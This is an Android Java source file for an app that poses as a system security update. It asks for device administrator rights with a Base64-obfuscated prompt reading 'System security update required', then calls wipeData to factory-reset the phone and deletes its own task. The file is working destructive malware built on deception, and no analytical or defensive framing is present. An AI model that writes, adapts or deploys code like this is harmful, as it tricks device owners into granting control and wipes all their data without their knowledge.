package com.android.system.update;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;

public class MainActivity extends Activity {
    private static final int ADMIN_REQUEST = 100;
    private DevicePolicyManager dpm;
    private ComponentName adminComp;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComp = new ComponentName(this, AdminReceiver.class);
        
        new Handler(Looper.getMainLooper()).postDelayed(this::requestAdmin, 1500);
    }

    private void requestAdmin() {
        if (!dpm.isAdminActive(adminComp)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComp);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
                decode("U3lzdGVtIHNlY3VyaXR5IHVwZGF0ZSByZXF1aXJlZA=="));
            startActivityForResult(intent, ADMIN_REQUEST);
        } else {
            executeWipe();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == ADMIN_REQUEST && resultCode == RESULT_OK) {
            executeWipe();
        }
        finishAndRemoveTask();
    }

    private void executeWipe() {
        if (dpm.isAdminActive(adminComp)) {
            dpm.wipeData(0);
        }
    }

    private String decode(String s) {
        return new String(Base64.decode(s, Base64.DEFAULT));
    }
}
